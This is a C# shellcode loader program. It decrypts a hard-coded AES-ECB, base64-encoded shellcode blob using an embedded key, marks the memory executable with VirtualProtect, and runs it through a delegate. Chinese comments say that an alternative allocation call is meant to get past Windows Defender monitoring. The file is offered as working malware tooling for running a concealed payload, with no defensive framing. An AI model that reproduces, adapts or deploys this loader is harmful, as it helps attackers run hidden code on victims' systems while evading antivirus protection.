using System;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace test
{
    class Program
    {
        public enum Protection
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        private delegate Int32 ShellcodeDelegate();

        static void ExecuteShellcode(byte[] buf)
        {
            //IntPtr mem = VirtualAllocExNuma(System.Diagnostics.Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0); // 分配内存绕过defender监控
            unsafe //允许使用指针变量
            {
                fixed (byte* ptr = buf) // 初始化固定大小的指针
                {
                    // 设置内存可读可写可执行
                    IntPtr memoryAddress = (IntPtr)ptr;
                    VirtualProtect(memoryAddress, (UIntPtr)buf.Length, (UInt32)Protection.PAGE_EXECUTE_READWRITE, out uint lpfOldProtect);

                    ShellcodeDelegate func = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(ShellcodeDelegate));
                    func();
                }
            }
        }


        public static byte[] ShellcodeDecrypt(string EncryptStr, string Key)
        {
            try
            {
                byte[] keyArray = Convert.FromBase64String(Key);
                byte[] DecryptedArray = Convert.FromBase64String(EncryptStr);

                RijndaelManaged rDel = new RijndaelManaged();
                rDel.Key = keyArray;
                rDel.Mode = CipherMode.ECB;
                rDel.Padding = PaddingMode.PKCS7;

                ICryptoTransform cTransform = rDel.CreateDecryptor();
                byte[] base64Array = cTransform.TransformFinalBlock(DecryptedArray, 0, DecryptedArray.Length);
                String Shellcode_Base64 = Encoding.UTF8.GetString(base64Array);
                byte[] resultArray = Convert.FromBase64String(Shellcode_Base64);
                //return Encoding.UTF8.GetString(resultArray);//  UTF8Encoding.UTF8.GetString(resultArray);
                return resultArray;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return null;
            }
        }
        static void Main(string[] args)
        {
            string key = "wvQ9xZ3xAKPl3aQJtBye7reYqdEKDqJb";
            string EncryptedShellcode =
                "biDR4/iA904omJhaQqezgFkHQ2zoGm3bJZtlqJWYgvsUhR4tZDOFZvbVIFZYNsELVe45nxIh6BWIc6cmxftWkYdlIFQzF6GVvSrSer1tnuTnfTc+1Vmf+aEqXDkFQVpLWYTTnbQKJGnd1vaCJDXfbYvBouHWrh34HeD+8+82NKXX7YOpqUD+BkxyfJXo4b+0abDBIPAcM1bjQNmWAEZJbst75jv3Hcqu2yqD6sKHtnmMU9dvi51pLgRQoDgD6Ea63hy5ddwt+6xar/xoG6IAfhupB7E6S7U6717PBdohQDgM39kKOZy5GOf1xjiiHASuKtgfKhdJHP2MDIehV2sDLSUm/5nHo01iPRtvjsk4cR+dy1UW2N0KmekGi/4a0B+TtLcuZHYfLfOaRGwDMa943EvWZAftiFB2PoZ+esUg6/A0nyg5VmDFbTj+Y4T58qNTUJLBMZGh7pjxag6OcotOheUQmKR73s/e9dFt7y8LMAtaMT9ljg9I9aaD4IB3QFwRNAvUpkCADyddRXgJrvcqfCiIMBlgXsI9kWa5vSauxqEcCd7JtCLhcGiH0muE0RgCAaD/I+wqdBUudCfYorqEh5CRPJ49eOqq89Wan1JS8RmtgZd48tk12E3cpXOo+hpOcsPwTZv9J+RwlJBX5joYg/jFmk364eewY6YXrmBqfyvQoayePyNkV9c+vpOlCf+cJ3b+lLd2K/gHagrP+NNfr1wwSiJ6+J/Yteu3y+iCGxk/lbGHWFr4OYQzMzrIgh8UYtEnN2CHOhce4mcpGmj2Bi3A42DUA9AIFMu1m/QOG+tx4gvkuL/J88ihdk8BTBhwQiogwj4td2OfD6SLpFuvqz2iGlt34IndbtPMkKMKYWk6HjphR3eVknz8ZsoCPQGWzh7XIoFtRC8IkTij0t4jHf8g7jrc2zVrH0kz9DdmUvX/LxZblG/PgXbw+2ylzm4KrD0QaW3cdXDvBedY0eaA3eauWLjA73+Xwf576qLDnkYC+KRWOXfsnv0wW+qWPa4Cq2LG4+mZndoK2JJ36KApZu8D1V7GPnekSrbOdg5aQjAgmq79DDV10fJD+wyHeCi/Zj4qaQreWEYQSHl6Khs00nt2wnc+LK+1TYA7ZoThP4b8UWx+6wsp+0JCBCcZDCwHKbntMW2sQz7La7M9qldYmMIqxqXNLhSmKNonUP9H5bJkHeawT8KyGQfl0jzMVNWumJetkN9N0lmTqU8lcUNR5V3rtUGKTA3G+q9hu2ZlJ3RSfQ013CoMd+tWH7qu6Gt62p9L99oM9cIWDvXk4B3sRZYrJwBRCfkiUxuf2RTG1iU=";

            //String shellcode = String.Empty;
            //shellcode = ShellcodeDecrypt(ShellcodeEncrypt,key);
            byte[] shellcode = ShellcodeDecrypt(EncryptedShellcode, key);
            ExecuteShellcode(shellcode);
        }
    }
}
